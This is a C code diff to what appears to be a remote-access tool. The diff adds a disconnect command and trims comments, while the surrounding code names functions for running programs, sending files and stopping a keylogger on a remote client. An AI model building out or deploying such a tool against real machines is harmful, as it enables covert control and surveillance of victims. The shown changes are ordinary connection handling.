@@ -30,15 +30,10 @@ void clear_process_packets(struct session_info * session_info) {
 }
 
 static int sequence_greater_than(const uint16_t a, const uint16_t b) {
-    // If the gap is more than half the uint16_t range, wraparound has occurred
-    // e.g. a=65535, b=0 -> b is actually ahead of a
-    // e.g. a=1,     b=65535 -> a is actually ahead of b
+    // Check for wrap around if numbers differ more than half
     const uint16_t half = 0x8000; // 32768
     if (a == b) return 0;
-    // The "distance" from b to a going forward
     const uint16_t forward_dist = (uint16_t)(a - b);
-    // If going forward from b to a is more than half the range,
-    // then a is actually behind b (wraparound)
     return forward_dist < half;
 }
 
@@ -93,6 +88,10 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
         case RUN_PROGRAM:
             log_message("Running Program\n");
             encountered_command_code = RUN_PROGRAM;
+            break;
+        case DISCONNECT:
+            log_message("Handling Disconnect\n");
+            encountered_command_code = DISCONNECT;
             break;
         case SEND_FILE:
             log_message("Send File\n");
@@ -400,6 +399,10 @@ void process_run_command(struct session_info * session_info) {
 
 }
 
+// NOLINTNEXTLINE
+void handle_disconnect(struct session_info * session_info) {
+    connection_loop = false;
+}
 
 /**
  *
@@ -417,8 +420,9 @@ void send_stop_keylogger(int fd) {
 }
 
 // Disconnect
-void send_disconnect(int fd) {
-
+// NOLINTNEXTLINE
+void send_disconnect(struct server_options * server_options) {
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, DISCONNECT);
 }
 
 // NOLINTNEXTLINE
